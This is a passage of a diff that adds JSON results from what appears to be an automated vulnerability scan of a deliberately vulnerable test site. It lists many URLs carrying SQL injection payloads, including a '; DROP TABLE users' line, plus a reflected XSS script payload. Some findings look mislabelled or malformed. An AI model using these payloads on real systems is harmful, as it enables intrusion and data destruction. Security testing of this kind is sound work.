+          "http://testphp.vulnweb.com/categories.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/artists.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/artists.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/index.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/cart.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/artists.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/categories.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/login.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/login.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/artists.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/index.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/index.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/index.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/disclaimer.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/cart.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/guestbook.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/guestbook.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/artists.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/cart.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/login.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/categories.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/index.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/disclaimer.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/categories.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/login.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/categories.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/categories.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/login.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/artists.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/categories.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/categories.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/index.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/login.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/login.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/categories.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/categories.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/guestbook.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/login.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/artists.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/artists.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/cart.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/categories.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/guestbook.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/index.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/index.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/cart.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/cart.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/artists.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' AND SLEEP(3)--",
+          "http://testphp.vulnweb.com/?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/artists.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/search.php?test=query?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/artists.php?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1--",
+          "http://testphp.vulnweb.com/categories.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/cart.php?test=' OR 1=1#"
+        ],
+        "affected_urls_count": 120,
+        "payload": "\" OR \"1\"=\"1",
+        "severity": "High",
+        "type": "SQL Injection (Error-Based)",
+        "url": "http://testphp.vulnweb.com/search.php?test=query?test=\" OR \"1\"=\"1"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query"
+        ],
+        "affected_urls_count": 1,
+        "location": "POST parameter: searchFor",
+        "payload": "<script>alert('XSS')</script>",
+        "severity": "High",
+        "type": "Reflected XSS (POST)",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "Unknown URL"
+        ],
+        "affected_urls_count": 1,
+        "error": "Failed to fetch URL: ('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/AJAX/index.php?test=' OR 1=1 LIMIT 1--",
+          "http://testphp.vulnweb.com/AJAX/index.php?test=' AND 1=0 UNION SELECT NULL--"
+        ],
+        "affected_urls_count": 2,
+        "payload": "' OR 1=1 LIMIT 1--",
+        "severity": "High",
+        "type": "SQL Injection (Time-Based)",
+        "url": "http://testphp.vulnweb.com/AJAX/index.php?test=' OR 1=1 LIMIT 1--"
+      }
+    ],
+    "unique_severity_counts": {
+      "High": 3,
+      "Low": 2,
+      "Medium": 7,
+      "Unknown": 1
+    }
+  }
+}
